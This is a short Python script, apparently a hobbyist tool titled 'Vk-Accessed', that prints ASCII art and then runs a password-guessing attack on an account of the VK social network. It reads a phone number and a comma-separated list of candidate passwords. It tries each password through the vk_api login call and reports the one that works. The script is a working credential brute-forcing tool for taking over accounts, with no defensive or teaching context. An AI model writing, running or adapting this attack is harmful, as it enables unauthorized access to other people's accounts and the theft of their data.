import vk_api
from colorama import init, Fore, Back, Style


init()

def console_picture():
    print(Fore.YELLOW)
    print("#################*:::---::-------%################")
    print("################**::::------------%###############")
    print("###############%**::::-------------###############")
    print("###############***::::-------------:##############")
    print("##############%***::::--------------%#############")
    print("##############=***::::--------------*#############")
    print("##########=*::=++**:::------------------*=@#######")
    print("#####@=+****:::*+****:::::--------------------=###")
    print("######%+****::::::---:::------------------.*@#####")
    print("###########=*:::::--------------------.*@#########")
    print("###############%*:-----------------*@#############")
    print("###############@#####%+*:---:+%#####%#############")
    print("############===%%%@##########@%==+**##############")
    print("##############--:::::::*####***::---.+############")
    print("################+-.....*####......:=##############")
    print("##################################################")
    print(Fore.GREEN + "Vk-Accessed")
console_picture()


print(Style.RESET_ALL)


if __name__ == '__main__':
    phone = input('phone: ')
    words = list(map(str, input("words: ").split(', ')))
    for password in words:
        try:
            vk_session = vk_api.VkApi(phone, str(password))
            vk_session.auth()
            print(Fore.GREEN + "FAUND: " + str(password))
            break
        except:
            print(Fore.RED + str(password) + ' BAD')
            

input()
